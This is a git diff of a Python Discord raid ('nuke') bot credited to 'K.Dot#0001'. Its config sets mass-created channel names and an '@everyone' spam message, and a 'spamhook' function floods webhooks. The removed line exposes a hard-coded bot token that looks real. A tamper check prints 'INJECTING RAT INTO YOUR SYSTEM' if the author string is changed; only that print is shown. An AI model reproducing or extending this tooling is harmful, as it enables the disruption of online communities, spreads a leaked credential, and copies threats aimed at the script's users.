@@ -17,7 +17,7 @@ __author__ = 'K.Dot#0001'
 
 #===================CONFIG===================#
 
-TOKEN = 'MTAxMTI3OTg0NzMwNzM0NTk3MA.GkFYwY.5BDKxKyw1xv5ftYEMBOjHJMZNw2CxovC2THNsk' #ur BOT token here
+TOKEN = '' #ur BOT token here
 CHANNEL_NAMES = 'K.Dot#0001' #name of the created channels
 MESSAGE = '@everyone K.Dot#0001 was here! ' #message u want ALSO make sure there is a space at the end if your using spam_prn
 PREFIX = 'god ' #ur prefix
@@ -163,7 +163,8 @@ def spamhook(hook):
                 time.sleep(0.5)
     sys.exit(0)
 
-proxy_scrape()
+if PROXIES == True:
+    proxy_scrape()
 
 if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
     print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
